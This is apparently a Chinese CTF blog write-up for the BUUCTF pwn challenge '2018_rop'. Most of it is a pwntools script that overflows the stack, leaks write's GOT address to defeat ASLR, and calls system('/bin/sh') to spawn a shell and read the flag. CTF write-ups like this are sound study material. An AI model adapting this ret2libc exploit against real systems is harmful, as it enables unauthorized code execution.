---
title: "BUUCTF Pwn 铁人三项[第五赛区]_2018_rop"
date: 2020-04-06T22:50:22+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn 铁人三项[第五赛区]_2018_rop

考点

1、栈溢出

2、ret2libc

![image-20200406225347153](/images/image-20200406225347153.png)

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./2018_rop')
sh = remote('node3.buuoj.cn',25257)
elf = ELF('./2018_rop')
libc = ELF('./ubuntu18-x86-libc-2.27.so')

main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
libc_write = libc.symbols['write']
libc_system = libc.symbols['system']
libc_binsh = libc.search('/bin/sh').next()
offset = 0x88 #到ebp的偏移，到retn还需要+0x4的ebp大小
ebp = 0x4

payload = 'a'*(offset+ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #write来泄露write真实地址，write的返回为main
sh.sendline(payload)
write_real_addr = u32(sh.recv(4))

base_addr = write_real_addr - libc_write
system_addr = libc_system + base_addr
binsh_addr = libc_binsh + base_addr

payload = 'a'*(offset+ebp) + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendline(payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200406225504252](/images/image-20200406225504252.png)